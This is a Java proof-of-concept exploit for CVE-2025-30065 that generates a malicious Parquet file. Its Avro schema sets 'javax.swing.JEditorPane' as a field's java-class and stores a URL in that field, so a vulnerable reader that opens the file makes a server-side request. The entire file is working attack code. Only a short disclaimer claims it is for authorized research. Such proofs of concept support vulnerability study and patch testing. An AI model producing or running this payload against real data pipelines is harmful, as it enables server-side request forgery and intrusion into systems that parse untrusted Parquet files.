// DISCLAIMER: For authorized security research only.

package com.evil;

import org.apache.avro.Schema;
import org.apache.avro.generic.GenericData;
import org.apache.avro.generic.GenericRecord;
import org.apache.hadoop.fs.Path;
import org.apache.parquet.avro.AvroParquetWriter;
import org.apache.parquet.hadoop.ParquetWriter;


public class GenerateMaliciousParquetSSRF {
    private static final String MALICIOUS_PARQUET_DEST = "exploit-ssrf.parquet";

    public static void main(String[] args) throws Exception {

        String schemaSSRF = """
              {
              "type": "record",
              "name":  "MaliciousRecord",
              "fields" : [
                {
                    "name": "evil",
                    "type": {
                        "type": "string",
                        "java-class": "javax.swing.JEditorPane"
                    }
                }
              ]
              
              }
                """;

        Schema schema = new Schema.Parser().parse(schemaSSRF);
        GenericRecord record = new GenericData.Record(schema);
        // start server using python -m http.server 8000
        record.put("evil", "http://localhost:8000/ssrf");

        Path path = new Path(MALICIOUS_PARQUET_DEST);
        ParquetWriter<GenericRecord> writer = AvroParquetWriter.<GenericRecord>builder(path)
                .withSchema(schema)
                .build();

        writer.write(record);
        writer.close();

        System.out.println("CVE-2025-30065 Poc: malicious parquet generated->" + MALICIOUS_PARQUET_DEST);
    }
}
